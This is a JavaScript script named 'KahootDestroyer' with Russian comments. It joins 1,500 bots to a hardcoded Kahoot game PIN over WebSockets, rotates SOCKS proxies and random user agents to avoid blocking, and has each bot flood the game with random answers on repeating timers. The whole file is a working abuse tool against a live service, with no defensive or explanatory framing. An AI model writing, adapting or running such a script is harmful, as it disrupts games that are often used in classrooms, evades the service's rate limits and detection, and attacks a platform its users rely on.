const KahootDestroyer = async () => {  
  const PIN = 585088;  
  const BOTS_COUNT = 1500;  
  const PROXIES = [  
    'socks5://user:pass@geo.iproyal.com:32325',  
    'socks4://user:pass@premium.proxyrack.net:4444'  
  ];  

  // Инициализация ботов  
  for(let i = 0; i < BOTS_COUNT; i++){  
    try {  
      const agent = require('random-useragent').getRandom();  
      const proxy = PROXIES[Math.floor(Math.random()*PROXIES.length)];  
      
      // 1. Получение токена сессии  
      const { data } = await axios({  
        method: 'POST',  
        url: `https://play.kahoot.it/reserve/session/${PIN}`,  
        httpsAgent: new (require('socks-proxy-agent').SocksProxyAgent)(proxy),  
        headers: {  
          'User-Agent': agent,  
          'Origin': 'https://kahoot.it',  
          'Referer': `https://kahoot.it/`  
        }  
      });  

      // 2. WebSocket подключение  
      const ws = new WebSocket(`wss://play.kahoot.it/cometd/${PIN}/${data.challenge}`, {  
        agent: new (require('socks-proxy-agent').SocksProxyAgent)(proxy)  
      });  

      // 3. Обработчики событий  
      ws.on('open', () => {  
        console.log(`[LIVE] Бот ${i} подключен!`);  
        // Флуд ответами  
        setInterval(() => {  
          ws.send(JSON.stringify([{  
            channel: "/service/controller",  
            data: {  
              type: "message",  
              id: Math.floor(42 + Math.random() * 1e5),  
              content: JSON.stringify({  
                choice: Math.floor(Math.random()*4),  
                meta: {  
                  lag: Math.random()*1000,  
                  device: { screen: { width: 1920, height: 1080 } }  
                }  
              })  
            }  
          }]));  
        }, Math.random()*4000 + 1000);  
      });  

      ws.on('error', (e) => console.log(`[DEAD] Бот ${i} ошибка: ${e.code}`));  

    } catch(e) {  
      console.log(`[ERROR] Бот ${i} критическая ошибка: ${e.message}`);  
    }  
    await new Promise(resolve => setTimeout(resolve, 250));  
  }  
};  

KahootDestroyer();  
